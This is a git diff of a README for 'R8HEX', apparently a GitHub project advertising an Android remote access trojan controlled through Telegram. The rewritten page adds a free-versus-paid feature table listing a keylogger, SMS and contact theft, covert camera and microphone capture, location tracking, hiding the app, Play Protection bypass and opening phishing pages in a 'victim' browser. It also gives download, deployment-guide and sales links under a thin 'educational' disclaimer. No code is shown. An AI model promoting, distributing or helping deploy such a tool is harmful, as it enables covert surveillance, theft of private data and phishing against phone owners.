@@ -1,33 +1,103 @@
-<p align="center">
-  <img src="image/NU9.png" alt="Important Disclaimer" style="width: 80%; max-width: 90px; height: 90px;" />
-</p>
+<div align="center">
+  
+  <img src="image/NU9.png" alt="Disclaimer" width="120" />
 
-<p align="center">
-  <b>This software/tool is strictly for educational and research purposes only.</b>
+  ## ⚠️ Important Disclaimer  
+  **This software/tool is strictly for Educational & Research purposes only.**  
+  The intention behind this project is to help **Cybersecurity Professionals, Students, and Researchers**  
+  understand how **Malware, RATs & Ransomware** operate so they can build stronger defenses.  
 
-The intention behind this project is to help cybersecurity professionals, students, and researchers understand how malware, remote access tools, and ransomware operate, enabling them to develop better defense mechanisms against such threats.
-</p>
+  ---
 
-<p align="center">
-  <img src="image/SS.png" alt="logo" style="max-width: auto%; height: auto;" />
-</p>
-<p align="center">
-  <b><i>A flexible Android RAT integrated with Telegram without port forwarding.</i></b></p>
-  <p align="center">
-    <b><i>You can hack Android Phone & Tablet.Check All Features Click On Links.</i></b>
-</p>
+  <img src="image/SS.png" alt="Logo" width="200" />
 
-- ### [𝗣𝗔𝗡𝗘𝗟 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧](https://github.com/Tocsiop/R8HEX/blob/main/Readmds/Panel_ss.md)
+  ### 📱 A Flexible Android RAT integrated with Telegram (No Port Forwarding Needed)
+  **You can test Android Phones & Tablets.**  
+  🔗 Check full features by visiting the links below.
 
-- ### [𝗙𝗥𝗘𝗘 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 v1.2.0](https://github.com/Tocsiop/R8HEX/blob/main/Readmds/Features.md)
+  ---
 
-- ### [𝗣𝗔𝗜𝗗 𝗩𝗘𝗥𝗦𝗜𝗢𝗡](https://github.com/Tocsiop/R8HEX/blob/main/Readmds/Paid.md)
+  <!-- 🚀 GitHub Badges -->
+  ![GitHub release (latest by date)](https://img.shields.io/github/v/release/Tocsiop/R8HEX?color=blue&label=Latest%20Release&style=for-the-badge)
+  ![GitHub stars](https://img.shields.io/github/stars/Tocsiop/R8HEX?style=for-the-badge&color=yellow)
+  ![GitHub forks](https://img.shields.io/github/forks/Tocsiop/R8HEX?style=for-the-badge&color=orange)
+  ![GitHub issues](https://img.shields.io/github/issues/Tocsiop/R8HEX?style=for-the-badge&color=red)
+  ![GitHub license](https://img.shields.io/github/license/Tocsiop/R8HEX?style=for-the-badge&color=green)
 
-- ### [𝗛𝗢𝗪 𝗧𝗢 𝗗𝗘𝗣𝗟𝗢𝗬 𝗙𝗥𝗘𝗘 𝗩𝗘𝗥𝗦𝗜𝗢𝗡](https://github.com/Tocsiop/R8HEX/blob/main/Readmds/Deployed.md)
+  ---
 
-- ### [𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗙𝗥𝗘𝗘 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗙𝗜𝗟𝗘 v1.2.0](https://github.com/Tocsiop/R8HEX/archive/refs/tags/V1.2.0-R8HEX.zip)
+  <!-- 🎯 Custom Badges -->
+  ![Telegram](https://img.shields.io/badge/Telegram-Join%20Channel-blue?style=for-the-badge&logo=telegram)
+  ![Developer](https://img.shields.io/badge/Developer-FridayXD-green?style=for-the-badge&logo=github)
+  ![Version](https://img.shields.io/badge/Free%20Version-v1.2.0-yellow?style=for-the-badge)
+  ![Paid](https://img.shields.io/badge/Paid%20Version-Available-red?style=for-the-badge)
 
-# 𝗝𝗢𝗜𝗡 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 
+</div>
 
-- ### [𝗝𝗼𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹](https://telegram.me/r8hex)
-- ### [𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥](https://telegram.me/fridayxd)
+---
+
+## 📸 Panel Screenshot
+- [🔗 View Panel Screenshot](https://github.com/Tocsiop/R8HEX/blob/main/Readmds/Panel_ss.md)
+
+---
+
+## ⚖️ Free vs Paid Feature Comparison
+
+| Feature / Module                                | Free ✅ | Paid 🚀 |
+|-------------------------------------------------|---------|---------|
+| 🔦 Torch On/Off                                 | ✅      | ✅      |
+| 📳 Device Vibrate                               | ✅      | ✅      |
+| ✉️ Receive all SMS                              | ✅      | ✅ (with sent logs) |
+| ✉️ Send SMS to any number                       | ✅ (fixed) | ✅      |
+| ✉️ Send SMS to all contacts                     | ✅      | ✅      |
+| 👤 Receive all contacts                         | ✅      | ✅      |
+| 📷 Capture main & front camera                  | ✅      | ✅      |
+| 🎙 Microphone recording (custom duration)       | ✅      | ✅      |
+| 👤 Call Logs                                    | ✅      | ✅ (Incoming + Outgoing) |
+| 🔔 Notification reader                          | ✅      | ✅      |
+| 🗨️ Show Toast                                   | ✅      | ✅      |
+| 🎧 Play Audio                                   | ✅      | ✅      |
+| 🤖 Change Wallpaper                             | ✅ (basic) | ✅ (full) |
+| 📋 Receive clipboard text                       | ✅      | ✅      |
+| 📂 File Manager (Get/Delete files)              | ✅ (basic) | ✅ (Powerful) |
+| 📌 Attractive Premium UI                        | ✅ (new) | ✅      |
+| ℹ️ Deep Device Information                      | ❌      | ✅      |
+| 🎭 Change App Icon & Name (Hide App)            | ❌      | ✅ (new) |
+| 🛰️ Device Location Tracking                     | ❌      | ✅      |
+| 🔐 Open phishing page in victim browser         | ❌      | ✅ (new) |
+| 📒 Gallery Puller (all photos)                  | ❌      | ✅      |
+| 🔔 Custom notification sender (with link)       | ❌      | ✅      |
+| 🔐 Keylogger                                    | ❌      | ✅      |
+| 🖥️ Screenshot capture                           | ❌      | ✅      |
+| 🤖 Auto Permission Grant                        | ❌      | ✅      |
+| 🔴 Custom Modifications (multi-bot, stealth, etc.) | ❌   | ✅      |
+| ☁️ Hosting Support (Glitch/Heroku/Replit)       | ❌      | ✅      |
+| ♥ Play Protection Bypass                        | ✅      | ✅      |
+| 🌍 Real-time Details & Custom Web               | ✅      | ✅      |
+| 🔥 More Advanced Features                       | ❌      | ✅ (updates added) |
+
+---
+
+## ⚙️ How to Deploy Free Version
+- [📖 Deployment Guide](https://github.com/Tocsiop/R8HEX/blob/main/Readmds/Deployed.md)
+
+---
+
+## ⬇️ Download
+- [📂 Download Free Version v1.2.0](https://github.com/Tocsiop/R8HEX/archive/refs/tags/V1.2.0-R8HEX.zip)
+
+---
+
+## 📢 Join Community
+- [🚀 Join Telegram Channel](https://t.me/r8hex)  
+- [👨‍💻 Developer](https://t.me/fridayxd)
+
+---
+
+<div align="center">
+
+### 🛡️ Disclaimer  
+This repository is only for **educational awareness**.  
+The author is **not responsible** for any misuse of this project.  
+
+</div>
